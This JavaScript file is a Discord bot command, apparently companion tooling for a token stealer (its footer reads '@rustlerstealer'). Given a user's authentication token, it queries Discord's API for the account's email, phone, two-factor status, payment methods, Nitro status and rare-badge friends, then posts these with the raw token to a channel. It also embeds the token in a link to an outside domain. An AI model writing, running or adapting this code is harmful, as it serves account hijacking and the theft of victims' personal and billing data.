const Discord = require("discord.js")
const axios = require("axios")

module.exports.run = async (bot, message, args) => {
  let token = args[0];
  if (!token) return message.channel.send(`Invalid argument! Use: ${bot.config.prefix}info <token>`);
  let json;
  await axios.get("https://discord.com/api/v9/users/@me", {
      headers: {
          "Content-Type": "application/json",
          "authorization": token
      }
  }).then(res => { json = res.data })
      .catch(() => { })
  if (!json) return message.channel.send('Invalid token!');
  const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:staff:874750808728666152>",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:partner:874750808678354964>",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:hypesquad_events:874750808594477056>",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:bughunter_1:874750808426692658>",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:early_supporter:874750808414113823>",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:bughunter_2:874750808430874664>",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:developer:874750808472825986>",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:bravery:874750808388952075>",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:brilliance:874750808338608199>",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:balance:874750808267292683>",
        Rare: false,
    },
    Discord_Official_Moderator: {
        Value: 262144,
        Emoji: "<:moderator:976739399998001152>",
        Rare: true,
    }
};

async function getRelationships(token) {
    var j = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    })
    var json = j.data
    const r = json.filter((user) => {
        return user.type == 1
    })
    var gay = '';
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            gay += `${b} - \`${z.user.username}#${z.user.discriminator}\`\n`
        }
    }
    if (gay == '') gay = "*No rare friends.*"
    return {
        length: r.length,
        frien: gay
    }
}

async function getBilling(token) {
    var j = await axios.get('https://discord.com/api/v9/users/@me/billing/payment-sources', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    })
    var json = j.data

    var bi = '';
    json.forEach(z => {
        if (z.type == 2 && z.invalid != !0) {
            bi += "<:946246524504002610:962747802830655498>";
        } else if (z.type == 1 && z.invalid != !0) {
            bi += ":credit_card:";
        }
    });
    if (bi == '') bi = `\`No Billing\``
    return bi;
}

function getBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') b = `\`No Badges\``
    return b;
}

function getRareBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
    };
    return b;
}

async function getNitro(flags, id, token) {
    switch (flags) {
        case 1:
            return "<:946246402105819216:962747802797113365>";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return "<:946246402105819216:962747802797113365>";

            if (!info.premium_guild_since) return "<:946246402105819216:962747802797113365>";

            let boost = ["<:boost1month:967519402293624862>", "<:boost2month:967519562868338728>", "<:boost3month:969685462157525044>", "<:boost6month:969686607961665628>", "<:boost9month:967520103367340092>", "<:boost12month:969687191133499403>", "<:boost15month:967518897987256400>", "<:boost18month:967519190133145611>", "<:boost24month:969686081958207508>"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return `<:946246402105819216:962747802797113365> ${boost[i]}`
        default:
            return "";
    };
}

function getUserNitro(flags) {
    switch (flags) {
        case 1:
            return "\`Nitro Classic\`";
        case 2:
            return "\`Nitro Boost\`";
        default:
            return "\`No nitro\`";
    };
}

  var billing = await getBilling(token);
  const info = new Discord.MessageEmbed()
  .setDescription(`<:sudry:978378846346813562> **Token:**\n\`${token}\`\n[Copy token](https://superfurrycdn.nl/copy/${token})`)
  .addField("<:sudry:978378846858539068> Badges:", `${getBadges(json.flags)} ${await getNitro(json.premium_type, json.id, token)}`)
  .addField("<:sudry:978378846808203274> Nitro Type:", `${getUserNitro(json.premium_type)}`)
  .addField("<:sudry:978378847487660092> Billing:", `${billing}`)
  .addField("<:sudry:978378846611075072> Phone:", `\`${json.phone || "No phone"}\``)
  .addField("<:sudry:978378846632046652> Email:", `\`${json.email}\``)
  .addField("<:sudry:978378846476836865> 2FA Enabled:", `\`${json.mfa_enabled ? "Yes" : "No"}\``)
  .setAuthor(`${json.username}#${json.discriminator} (${json.id})`, "https://c.tenor.com/T3So8nwWyDkAAAAC/grunge-girl-aesthetic.gif")
  .setImage(`https://cdn.discordapp.com/banners/${json.id}/${json.banner}?size=512`)
  .setThumbnail(`https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`)
  .setFooter("@rustlerstealer")
  .setColor("2f3136")
  message.channel.send(info)
  }
module.exports.help = {
  name: "info"
}
